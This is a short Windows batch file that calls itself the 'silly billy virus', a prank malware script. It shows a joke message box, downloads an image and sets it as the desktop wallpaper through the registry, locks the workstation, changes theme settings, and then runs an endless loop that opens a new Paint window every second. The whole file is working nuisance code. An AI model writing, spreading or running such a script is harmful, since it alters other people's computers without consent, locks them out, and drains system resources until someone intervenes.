@echo off
title silly billy
color 0A
cls
echo silly billy virus, answer the question that it asks lil bro
echo MsgBox "are u the skibidi rizzler?", 4+32, "sillybilly" > %temp%\confirm.vbs
cscript //nologo %temp%\confirm.vbs >nul
del %temp%\confirm.vbs

set "imageUrl=https://media.tenor.com/Qfz661n_2SAAAAAe/yellow-emoji-funny.png"
set "imagePath=%temp%\fun_image.jpg"
powershell -Command "(New-Object Net.WebClient).DownloadFile('%imageUrl%', '%imagePath%')"
reg add "HKCU\Control Panel\Desktop" /v Wallpaper /t REG_SZ /d "%imagePath%" /f
RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters ,1 ,True
powershell -command "Add-Type -TypeDefinition 'using System; using System.Runtime.InteropServices; public class LockScreen { [DllImport(\"user32.dll\")] public static extern void LockWorkStation(); }'; LockScreen::LockWorkStation()"
powershell -Command "Set-ItemProperty -Path HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Themes\Personalize -Name ColorPrevalence -Value 1"
powershell -Command "Set-ItemProperty -Path HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Themes\Personalize -Name SystemUsesLightTheme -Value 0"
:spamloop
start "" "%SystemRoot%\System32\mspaint.exe" "%imagePath%"
timeout /nobreak /t 1 >nul
goto spamloop
echo skibidi
pause
